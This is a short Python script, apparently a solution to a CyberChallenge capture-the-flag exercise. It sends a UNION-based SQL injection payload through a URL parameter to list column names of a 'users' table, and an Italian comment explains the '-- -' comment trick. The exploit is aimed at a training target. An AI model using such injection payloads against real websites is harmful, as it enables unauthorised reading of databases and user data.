
import requests 
from bs4 import BeautifulSoup


s = requests.Session()

'''
--  
in SQL inizia un commento fino a fine riga.
Il trattino finale - è spesso usato negli exploit perché alcune query o filtri si aspettano che dopo -- ci sia uno spazio o un carattere valido di separazione.
Quindi -- - funziona come “commento + spazio” e rende più compatibile l’iniezione.
'''

query_injection = '5 union SELECT column_name FROM information_schema.columns WHERE table_name="users" -- -'

url = f'http://filtered.challs.cyberchallenge.it/post.php?id={query_injection}'



r = s.get(url)
print(r.request.url)
print(r.status_code)
soup = BeautifulSoup(r.content, 'html.parser')
print(soup)

